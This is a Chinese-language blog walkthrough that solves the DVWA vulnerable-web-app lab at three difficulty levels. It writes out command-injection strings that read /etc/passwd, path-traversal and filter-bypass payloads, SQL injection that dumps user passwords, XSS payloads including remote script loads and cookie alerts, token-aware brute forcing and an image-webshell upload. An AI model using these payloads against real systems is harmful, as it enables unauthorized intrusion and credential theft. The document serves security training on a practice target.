#  DVWA漏洞靶场通关手册（万字图文解析）   
原创 BlankSec  泷羽Sec-Blanks   2025-01-18 10:57  
  
# DVWA靶场通关  
  
- 一、安全等级：Low  
- （一）Brute Force 密码爆破  
- （二）Command Injection 命令注入  
- （三）CSRF   跨站脚本伪造  
- （四）File Inclusion 文件包含  
- （五）File Upload 文件上传  
- （六）SQL Injection SQL注入  
- （七）SQL 注入（Blind） 盲注  
- （八）Weak Session IDs  虚假身份伪造  
- （九）XSS  
- 二、安全等级：Medium  
- （一）Brute Force 密码爆破  
- （二）Command Injection 命令注入  
- （三）CSRF   跨站脚本伪造  
- （四）File Inclusion 文件包含  
- （五）File Upload 文件上传  
- （六）SQL Injection SQL注入  
- （七）SQL 注入（Blind） 盲注  
- （八）XSS  
- 三、安全等级：Hight  
- （一）Brute Force 密码爆破  
- （二）Command Injection 命令注入  
- （三）CSRF   跨站脚本伪造  
- （四）File Inclusion 文件包含  
- （五）File Upload 文件上传  
- （六）SQL Injection SQL注入  
- （七）SQL 注入（Blind） 盲注  
- （八）XSS  
- 文章精选  
- 学习交流群  
## 一、安全等级：Low  
### （一）Brute Force 密码爆破  
  
用户admin  
  
密码根据burp的爆破模块进行爆破  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtqwlCveVmTD2Wdn0NSZXxFU3sq5uH6uTyA8R10GqGo5uvNJ2iawgQs1g/640?wx_fmt=png&from=appmsg "")  
  
image  
### （二）Command Injection 命令注入  
  
这里让我们ping一个地址  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtnMkKibj34tMwCibD5t4vM7pGGOwEattYuIEHrnaAIxP9HcwEtpFjlJWw/640?wx_fmt=png&from=appmsg "")  
  
image  
  
直接输入127.0.0.1 去ping 本地执行一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtG32ADBshLOQElk224JGlPU31maR3W5m94nRQJ5v3ibu8HeiaRUcicqZ5A/640?wx_fmt=png&from=appmsg "")  
  
image  
  
这里我们可以用连接符| || & && 等去拼接字符，去执行我们想要执行的命令  
```
127.0.0.1&whoami

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtR8biaEVAhtrdC6ic2fNwQyBAHgXUymHldOZXwknqWstwNIH8iaFdvmKibw/640?wx_fmt=png&from=appmsg "")  
  
image  
#### 知识复习：命令连接符  
  
;（分号）  
  
命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行。  
> ❝  
> ping -c 1 127.0.0.1;whoami  
  
  
命令执行漏洞可以直接使用&&或者|和管道命令执行其他命令  
  
命令链接符号解析  
  
| (管道符号)  
  
通过管理符 可以将一个命令的标准输出管理为另外一个命令的标准输入，当它失败后，会执行另外一条命令  
> ❝  
> ping -c 1 127.0.0.1|whoami  
  
  
&(后台任务符号)  
  
命令按照顺序（从左到右）被执行，跟分号作用一样；此符号作用是后台任务符  
  
号使shell 在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作  
> ❝  
> ping-c 4 127.0.0.1&cat /etc/passwd&  
  
  
&&（逻辑与）  
  
前后的命令的执行存在逻辑与关系，只有【&&】前面的命令执行成功后  
，它后面的命令才被执行  
> ❝  
> ping -c 4 127.0.0.1&&whoami  
  
  
||（逻辑或）  
  
前后命令的执行存在逻辑或关系，只有【||】前面的命令执行失败后  
，它后面的命令才被执行；  
> ❝  
> ping -c ||whoami  
  
  
``（反引号）` **!!!**  
  
当一个命令被解析时，它首先会执行反引号之间的操作。例如执行echo`ls-a` 将  
  
会首先执行ls并捕获其输出信息。然后再将它传递给echo，并将ls的输出结果  
  
打印在屏幕上，这被称为命令替换  
  
echo whoami  
   命令替换，输出反引号内的命令  
  
$(command) 命令替换    与反引号相似   （命令替换）  
  
这是命令替换的不同符号。当反引号被过滤或编码时，可能会更有效。  
> ❝  
> ping -c 4 |echo $(whoami)  
  
  
win 命令链接符  
  
| &|| && 跟linux 一样  
### （三）CSRF   跨站脚本伪造  
  
URL中的参数为password_new、password_conf，修改其参数值就可以进行密码的修改操作，原理就是前端传参点被恶意利用执行后端密码修改操作  
  
第一个就是像这样在页面输入框中修改密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtsSiaicb2AiaBtbfbm8qR8hG3BplnGw54Ed8iahO7YZvKqCZia7WvzCtgdhg/640?wx_fmt=png&from=appmsg "")  
  
image  
  
第二个就是在URL中修改参数值然后发送请求就行修改  
  
？password_new=admin&password_conf=admin&Change=Change#  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtG5fBq0rqib5DAHG2kKTh1Vefz80EDqar2h8uzialyPLccfSCibNYID7dA/640?wx_fmt=png&from=appmsg "")  
  
image  
### （四）File Inclusion 文件包含  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDt4iaEAwDJPCjQWYwHujoTRUaHFPC6eOANOwpuc8SLlMRgll5HicDLoiaTA/640?wx_fmt=png&from=appmsg "")  
  
image  
  
我们点击第一个文件，发现文件名显示在URL中，这就表明文件名是可控的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtelPMQ8d665E6JCvkCqiaDibdG38w4KGBAN8MoFxV9dupCtibznQIoSKicQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
/fi/?page=../../../../../etc/passwd  修改URL  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDt8ibfEB73bTulxQVBzsicxA4ffib53WoKfCIUPvQAAgE2XVTb49ZWwEibGQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
触发文件包含漏洞，获得敏感文件信息  
### （五）File Upload 文件上传  
  
没有任何防护，说是上传图片文件，但是上传php文件也可以直接进行上传  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtiaSxd0txv1G4uUKYkjeFjDMLhbAGFB2GThFhxOaJVLCAPsxq11V4CfA/640?wx_fmt=png&from=appmsg "")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtZhGtU5QFgCNoyc1QBXzNdm1oAhr6onyaWPgOib2ZhpS35FVNTYZItQw/640?wx_fmt=png&from=appmsg "")  
  
image  
```
../../hackable/uploads/phpinfo.php

```  
  
拿到路径直接进行访问就可以进入到phpinfo页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtQXCmnicVVFtIW3EHdEwNLuc0uibDzpX1SLLfvJ11m2rDdicqsMydbm38w/640?wx_fmt=png&from=appmsg "")  
  
image  
### （六）SQL Injection SQL注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtzxenCakGo6FLdRJvaEdVxGCzybdftUDF5hPUlSGcYvGrKPebZsMFZw/640?wx_fmt=png&from=appmsg "")  
  
image  
  
SQL 注入的思路就是，先进行验证判断类型，后针对性进行SQL注入攻击  
  
这里可以看到输入的是1  
  
这里输入  
  
1 and 1=1# 进行验证，可以查询，表示存在sql注入，并且为数字类型的sql注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtKeqyn8ov0X2bnzkkhoSaMBXic5WhibRr42fk9z7t8zeFrnfNiazqBcRCA/640?wx_fmt=png&from=appmsg "")  
  
image  
```
1 union select user(),database()#

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtCzsWsQHggGmWG1EsLElTUtp3Pqqv2DUy68VykzZftAg6ttiaZsvm2icw/640?wx_fmt=png&from=appmsg "")  
  
image  
#### 知识复习：sql注入原理  
  
参数可控，使用户可以绕过防护对后端内容进行操作。  
  
参数包含危险语句使得对敏感文件进行操作。  
  
（1）1’报错验证原理  
  
正常:select * from users where id =1   正常查询  
  
错误: select * from users where id =1’  出现报错 同理 ‘1’’ 也会报错  
  
如果出现报错则可能存在SQL注入  
  
(2)1=1 与 1=2 验证(1=1为TURE 而 1=2 为FALSE)  
  
select * from users where id = 1 and 1=1  正常查询 与了一个TURE  
  
select * from users where id =1 and 1=2  查询为空（并不会报错） 与了一个FALSE  
  
判断是否存在注入打点:  
  
id = 1 and 1=1 --+  
  
id = 1 and 1=2 --+  
  
id = 1 or 1=1 --+  
  
id = '1' or '1'='1'--+  
  
id = "1" or "1"="1"--+  
  
或 id = 1 and sleep(10) --+  
### （七）SQL 注入（Blind） 盲注  
  
sql注入盲注就表明，网页不会有回显信息，需要我们利用另外的手段去获取信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtHgqticBKwH7vsCnzvFs8I2bHlH2a5jYWCCqf4wPqmZukncuvpQVDX5w/640?wx_fmt=png&from=appmsg "")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtmeia7oibCtMkBgYUlt6AQlcf0HbwLQJ7GPrmiajp9EUyWCU2JM4ibGAfUA/640?wx_fmt=png&from=appmsg "")  
  
image  
  
只有是或非两种状态,不会返回具体数据，所以就不能使用UNION查询  
```
1 select substring(database(),1,3)=’dvw’

```  
  
substring 取 database() 字段结果 1,3 从1开始长度为3的值，我们知道，语句真值为1时返回存在，为0时返回不存在，所以我们使用字符串的切片与字符串'dvw'做等号，如果数据库名称前三个确实是dvw那将会返回存在命令，反之  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtL7qGO4tY5MPJ7akerdl6taUnWsIJKfZOJePUYdtibWCYN8ibauxTWtPA/640?wx_fmt=png&from=appmsg "")  
  
image  
  
流程：  
  
先判断字符长度，使用if语句  
```
1 and if(length(database())=4)#

```  
  
然后再从第一个字符a-z 1-9 一个一个开始判断  
```
1 select substring(database(),1,1)=’a’

```  
```
1 select substring(database(),1,4)=’dvwa’

```  
  
当然手工的盲注效率过低，我们可以利用burp，进行字典爆破，这样更加迅速  
### （八）Weak Session IDs  虚假身份伪造  
  
我们拿到cookie可以免密码直接进入页面的。前端请求中带着Cookie给后端，后端就认为我们就是真正的用户，就不需要我们输入密码直接进入页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtjquhv9wpjLpI7lb2beLKAY3jCoSYeptryuLZHplcSVRfSUiacjahkgA/640?wx_fmt=png&from=appmsg "")  
  
image  
### （九）XSS  
#### Dom 型  
  
见框见参就X  
  
简单的检验语句  
  
<script>alert('XSS')</script>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtGk6Niaia0N4H7YvNG3ntzhln97hZ8zjsKoCe4eiayRAx7f3nl5ibHUaxUQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtr0HSoxwJhxVDW2fE4NJemCtlE0BeMMsjYpw7ibRWPtxhWvodu83DqSQ/640?wx_fmt=png&from=appmsg "")  
  
image  
#### 反射型  
  
一次型触发，见框就插  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDt0uE5Gicia2UQiboOvV1ia6OtNbfYqZMyIb8YM3h0BI1ZDTakvpVuicx4d4Q/640?wx_fmt=png&from=appmsg "")  
  
image  
#### 存储型  
  
一直存在，持久型，除非将存储信息删掉  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtOzhPfnBX7ySHdUTggSdJloQHHrIjAPe72U9rXUNF4ZmVD46LrFSjzw/640?wx_fmt=png&from=appmsg "")  
  
image  
#### 知识复习：XSS  
  
XSS测试语句  
  
在网站是否存在xss漏洞时，应该输入一些标签如<、>输入后查看网页源代码是 否过滤标签，如果没过滤，很大可能存在xss漏洞。 常用的测试语句  
  
<h5>1</h5>  
  
<span>1</span>  
  
<script>console.log(1);</script>  
  
"><span>x</span><"  
  
'>"><span>x</span><'  
  
"><span>x</span>//  
  
XSS攻击语句  
  
<script>alert(1)</script>  
  
<svg onload=alert(1)>  
  
<a href=javascript:alert(1)>  
  
<a href='javascript:alert(1)'>aa  
  
<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>  
  
<IMG SRC=http://3w.org/XSS/xss.js/>  
  
<IMG SRC=javascript:alert('XSS')>  
## 二、安全等级：Medium  
### （一）Brute Force 密码爆破  
  
还是和Low一样，都可以进行爆破，不一样的就是密码错误加了两秒的延时，就是速度慢一些，但是仍然可以使用burp进行爆破  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtuibJmv4352DtzlVEtlPRKic0EXVHjwHlWn6Sw9MXyqWwtibZOZceHn1jg/640?wx_fmt=png&from=appmsg "")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDt4SMvmqicmJ59laibUwvA4ocqXdaibMbiaBiaOXia53NEkfpfezZgZdw0UW8Q/640?wx_fmt=png&from=appmsg "")  
  
image  
### （二）Command Injection 命令注入  
  
127.0.0.1|whoami  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtr4u6v8ezurFiaRz8rva3a8Lqh4wFTCdbIOvcg9vdiaNtxZoSeveY3Cicg/640?wx_fmt=png&from=appmsg "")  
  
image  
  
这个等级下只是进行了简单的过滤但是过滤不完全，这里的 | （管道符）仍然可以使用，但是此处的 ;   
和&&  
被过滤掉了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtI6edPibzpHIJwDia7j0icIny4RoYkXzrh4AdD6ic0aiaUkq0WmXa9z7icVVw/640?wx_fmt=png&from=appmsg "")  
  
image  
### （三）CSRF   跨站脚本伪造  
  
这个等级下又加了一层判断  
  
if( stripos(   
  
_SERVER[ 'SERVER_NAME' ]) !== false )  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtVxBUGc808wyz69NdeIJh4wPQPpptT1cZic7MnIrYoqg9ejhB6DvdRaQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
这是对我们的Referer字段进行了判断，所以我们需要拿到正常访问的Referer字段，然后修改我们的数据包，就可进行修改密码了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtE9XibTPyptJOlh8Vld8g2yrYJrUUyRGrb0WuA8lMvhDao2B0TSict96g/640?wx_fmt=png&from=appmsg "")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtFIOPUgU9xUIqRV4pcwoiaFlJMsQ7jhopw2iclWjtgCbbAHVwx94kxIlQ/640?wx_fmt=png&from=appmsg "")  
  
image  
### （四）File Inclusion 文件包含  
  
再次输入../../../etc/passwd之后就不能显示了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtmTAjOb9vICXNE5Fk9icoZibCMgAVTJxF8RBd5ZXltVzxpaKrPWYMaEAQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtPeg0VS68aBwgNmKDNCmEQlgHKfR0Tibs4zVyONsGSVInj7209kjYd2g/640?wx_fmt=png&from=appmsg "")  
  
image  
  
我们发现是将../和..\，http过滤掉了，将其替换为空  
  
所以我们就可以进行双写绕过，我想得到一个../怎么办呢  
  
那就输入..././ ../被替换为空，那剩余的字符就是../了,同理http一样  
  
重新构造payloud  
  
..././..././..././..././..././etc/passwd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtQ995hwdDjkOgHkLCaquav4VGxdHZFbjMZzU8mkJplsgA9KLVLwGK5Q/640?wx_fmt=png&from=appmsg "")  
  
image  
  
使用http协议构造的话同理  
### （五）File Upload 文件上传  
  
这里对文件类型做了限制  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtJMxWcQ6eBicJjB0xnGwsAqJDzDqXFUWd7wlgn1IjYg1J509OZaMuArQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtHoXB9AibDiaibJjSpHxP6XCLTKuiaVxzuK8C8dHXqDTBdNWA9CcRBNyia0Q/640?wx_fmt=png&from=appmsg "")  
  
image  
  
burp抓包，修改一下数据包中的文件类型即可进行绕过  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtVBH6Bof7zLumQ3fmFvJTjnAVErC3ehLvwBlIzMzxI0QsfGTbno8HUA/640?wx_fmt=png&from=appmsg "")  
  
image  
  
之后便上传成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtL6PyibGouCtwEBTiaORpOzI0xviaWhdISd3WujBGt6LaKWBia3SFo5nEZQ/640?wx_fmt=png&from=appmsg "")  
  
image  
### （六）SQL Injection SQL注入  
  
和Low等级类似，但是id 传参是用的POST方式，需要使用burp抓包来进行sql注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtDNML5jNPKhIjH3fnZia9WexubLG1Xpcc2HLSbymuyehS7l6NNSUsqqg/640?wx_fmt=png&from=appmsg "")  
  
image  
### （七）SQL 注入（Blind） 盲注  
  
也是POST方法，在burp中进行盲注  
### （八）XSS  
#### Dom 型  
  
可以看到这里给我们的script 过滤掉了，那我们可以换其他的标签，比如img标签  
  
> </option><img src=1 οnerrοr=alert("XSS")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtwkCGWFLlSFk3Pvpo6DvibT1L1EyAg8wjiagsqialvpeicWFbIk8bfoBib5A/640?wx_fmt=png&from=appmsg "")  
  
image  
  
>/option></select><img src="javascript:alert('XSS')" />![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtXLgBhOhrcTzXjNkS8cs5fr8jRDUKniaxQ8q3I6k6KwiakzicURJxqB0SQ/640?wx_fmt=png&from=appmsg "")  
  
  
Xss的本质就是闭合标签，然后插入恶意代码  
#### 反射型  
  
这个同理，对script标签进行过滤，可以使用img标签进行注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtJaTPKAIzibO6KhZD7nE48ic3N7RlibWLx7ia2Sry1bRdDzybN415ibPE8Tg/640?wx_fmt=png&from=appmsg "")  
  
image  
#### 存储型  
  
这个是将script标签替换为空，所以我们可以进行双写绕过  
  
<scr<script>ipt>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtPg70gsbb501UnoFEVhkt9qtFqosVnYf9Tc0vWgtW6sXeZTlgjLuCibg/640?wx_fmt=png&from=appmsg "")  
  
image  
## 三、安全等级：Hight  
### （一）Brute Force 密码爆破  
  
就一个200响应码其他都是302  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtdhRC30XRtNI9aick5R9UXu0KTSb6saiaqbv0xpibPd9MVcfRzEuQzkZ5g/640?wx_fmt=png&from=appmsg "")  
  
image  
  
这个等级下就给登录上了一个token了，每一次登录token就会变一次，所以我们需要用burp配置一个宏，去让它自动获取这个token以此支持我们的爆破  
  
将这两个设为变量，并且设为草叉pitchfock模式  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDt5va8tVzXuQEkFBibg4zQVVPnCb2LhLwOjQO1Zszibek2bmzPhCc3fgyg/640?wx_fmt=png&from=appmsg "")  
  
image  
  
在Options里添加宏，并且获取回复拿到响应包，这里我们需要一个没有消耗点token的请求包，就是拦截后直接发给爆破模块去设置宏  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtgcUAliavTd3tIaMt0iasZOiaCySbzvWIn5qucicBGfpZBCxib1eYmLgnAqw/640?wx_fmt=png&from=appmsg "")  
  
image  
  
搜索token，然后用鼠标将引号中的值划出，上面的参数burp会自动进行补全，并且将这个token值记录下来：9653a36a825fa896bb73991583132c8a  
  
弄好之后就点击OK  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtiazqYXTWZLMCJHX0tJKwjic4khehTLVPVxXlpm4I82Cx2eHWCgaI4xqQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
重定向设置一下，这样最后登录就都是200显示了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtDHoUe3xyQraOBjvU9cRQbYl7ia9yicM8UD97vPXcnsZ6dXKgvXcW2pOw/640?wx_fmt=png&from=appmsg "")  
  
image  
  
网络错误重试给他设为0，token都是一次就无的肯定不能让它去重连的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtu1qfY0B3Y5b6dckgy99y0vVy08yNOZkzg27aJIrItbtPHLVicHNyKTQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
并发设为1不能让它并发爆破，需要token进行逐个验证使用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtGrHpcLqREJjiavJcmujFqxJBFzEmFCmFWWVxCjMFOFr34fLH6mVVegQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
第一个变量：字典加载  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtiaGfn9CicQBZwAiaCuo4RyKHZJNOIV9rlFvxyTXVI9VjoVMVLOpsX8qhA/640?wx_fmt=png&from=appmsg "")  
  
image  
  
第二个变量使用递归搜索（grep）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtibhtxJXibAGWtQFribyMye45ibJtZEbwzWMIS7HT0p2ibX6EJtQWXYQlwQA/640?wx_fmt=png&from=appmsg "")  
  
image  
  
然后开始攻击爆破  
  
结果直接出来了，并且我们看到每个token 都是不一样的，自动获取的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtYna1RMibFlB7VFb4mqdHABsu36Qqe3jsG09O9blGiaAJprS7eScJhAew/640?wx_fmt=png&from=appmsg "")  
  
image  
### （二）Command Injection 命令注入  
  
我们可以看到大部分的连接符都被过滤了。但是这个 | 管道符 被过滤的时候后面加了个空格  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtycvRRQFarPDRiavmExg6iccNyFnfHsjfSLrmCV6PYjjDDJibnKuqbjJSQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
所以我们使用127.0.0.1|whoami，也是可以做到RCE的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtlVuiaOwf9TGObyBCWYR78neqL8AhHZtKJozHkTKxQIZGNLAGtZyJthA/640?wx_fmt=png&from=appmsg "")  
  
image  
### （三）CSRF   跨站脚本伪造  
  
这里同样是加了一个token ，用token机制来防御CSRF。用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。这里因为对请求的token进行了验证，所以比上两个等级的更加的安全。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtuBgrUH8wJCLWjdTsxfzHjSm003mOOicPApnt5ogovcQq0iaLy8R6R8pA/640?wx_fmt=png&from=appmsg "")  
  
image  
### （四）File Inclusion 文件包含  
  
这里是直接做了白名单限制，必须为file*或者include.php否则就会File not found.  
  
但是我们仍然可以利用file伪协议进行绕过file:///etc/passwd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtLjchEEsvPGCdia8Qdh2vZUoCafhG0HUTEuDRGIc9zzfBJn13gjnY5Sg/640?wx_fmt=png&from=appmsg "")  
  
image  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtG0AnpxLkKWicDSYwARfuh7EKWp7kKuaFuMr9zfjC5t4ibFp3bKmaBf3Q/640?wx_fmt=png&from=appmsg "")  
  
image  
### （五）File Upload 文件上传  
  
这里没办法了，直接强制要求必须是png、jpg等图片格式文件。  
  
那就只能制作图片马了，并且搭配着上一个文件包含漏洞进行利用执行  
  
随便拿一张图片用文本编辑，添加上我们利用的php恶意代码，然后正常上传.![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtmLQeFR4e7KPjWxlfrIIrMpZgw7195FRussKWiaXjb5y0WZdNzNttibzg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtDuCr8veWY3I9RB1GwmvakLXskzp0tia9IWVO1p1qI0FeqREH4zhNLibQ/640?wx_fmt=png&from=appmsg "")  
  
image  
  
上传成功后回到文件包含漏洞点，用我们的php伪协议打开我们上传的图片，其中的phpinfo代码就会执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtcfq4FypMPfEE3LL9ApEtJdk1ZXSRc2Pjqyicib1JFJia7nceicbP4rF6Dg/640?wx_fmt=png&from=appmsg "")  
  
image  
### （六）SQL Injection SQL注入  
  
这里的话就是跳转到一个新的页面，并且对参数没有做任何防护，我们直接爆账号密码  
  
**1' union select user,password from users#**  
### （七）SQL 注入（Blind） 盲注  
  
我们可以看到这里给sleep设置了一个随机区间，这就导致基于时间状态的盲注就失效了。但是没事，我们还是像上面两个等级一样进行基于布尔值的盲注即可。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtaAQJaELYXzS0UgqDz973nJSCTan84cXBFLLhqoabmsKeF1vGI2JWrg/640?wx_fmt=png&from=appmsg "")  
  
image  
### （八）XSS  
#### Dom 型  
  
这里设置了白名单，只允许French，English，German以及Spanish  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtyC0GUmywunpcZ7BACqSvY4y8bwrdudjuh1PjlYH3vnmRBwtFIZaEPA/640?wx_fmt=png&from=appmsg "")  
  
image  
  
但是我们仍然有进行绕过的方法  
  
#</option></select><BODY ONLOAD=alert(document.cookie)>  
  
究其原理还是闭合的思想。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtPSN7JthBw08icdJGYaCkAzWBrFdwvDq1RlQssgnFfsCAhYLmsV7icfbA/640?wx_fmt=png&from=appmsg "")  
  
image  
#### 反射型  
  
这里对script进行了正则匹配的过滤，但是我们还是像上面一样使用其他类型的标签如img  
  
<img src=1 οnerrοr=alert("XSS")> ![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtsYpE8yfvMP38iaRqHJYGrDD0AFLoqFlEeiaGRdQrzh7UTIarYpozmO8g/640?wx_fmt=png&from=appmsg "")  
  
#### 存储型  
  
这个也是正则匹配过滤script，方法同上  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5IZsDqfQ73QXStXGw1ibficylp9IZVWGDtYLOo22BJnAn8dQlUyBsdibkANjJcceO2wEwCYvXoUEfAfDYfskGaVqQ/640?wx_fmt=png&from=appmsg "")  
  
image  
### 文章精选  
  
[pikachu漏洞靶场通关手册（万字图文解析）](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485581&idx=1&sn=e6b9fcb1d7395d24b75c2788fe77c394&scene=21#wechat_redirect)  
  
  
[SQLmap自动化SQL注入攻击神器---满满干货知识！！](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485353&idx=1&sn=5bc0ed4180bfcd45c8ddaf3f7dc2716c&scene=21#wechat_redirect)  
  
  
[FOFA搜索引擎语法---信息收集篇](https://mp.weixin.qq.com/s?__biz=MzkxNjg3NTQ4NA==&mid=2247485322&idx=1&sn=30ebbff69ae793676247af3791e49cd9&scene=21#wechat_redirect)  
  
  
